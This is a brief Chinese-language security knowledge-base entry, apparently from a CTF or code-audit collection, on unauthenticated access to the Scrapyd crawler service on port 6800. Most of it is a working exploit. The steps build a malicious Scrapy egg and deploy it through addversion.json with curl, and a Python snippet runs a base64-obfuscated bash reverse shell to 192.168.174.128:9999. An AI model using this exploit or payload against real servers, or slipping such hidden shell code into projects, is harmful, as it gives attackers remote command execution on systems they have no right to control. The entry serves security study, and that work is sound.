---
title: Scrapyd 未授权访问漏洞
category: code-audit
tags: [scrapyd, scrapy, rce, egg-deployment, spider]
triggers: [scrapyd, 6800, scrapy, addversion.json, 爬虫框架, 云服务, egg部署]
created: 2026-06-07
updated: 2026-06-07
sources: [ctf-kb/code-audit/Scrapyd 未授权访问漏洞.md]
---

## Summary

Scrapyd（Scrapy 云服务）默认监听 6800 端口，攻击者可部署恶意 Scrapy 包在服务器上执行任意命令。

## Details

### 利用步骤

1. 安装 Scrapy 和 scrapyd-client
2. 创建恶意项目，编辑 `__init__.py` 加入恶意代码
3. 打包并部署：

```bash
scrapyd-deploy --build-egg=evil.egg
curl http://your-ip:6800/addversion.json -F project=evil -F version=r01 -F egg=@evil.egg
```

### 反弹 Shell

```python
import os
os.system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYxCgo= | base64 -d | bash')
```

## Connections

- GHSA: [[code-audit/ghsa-cloud-security]]
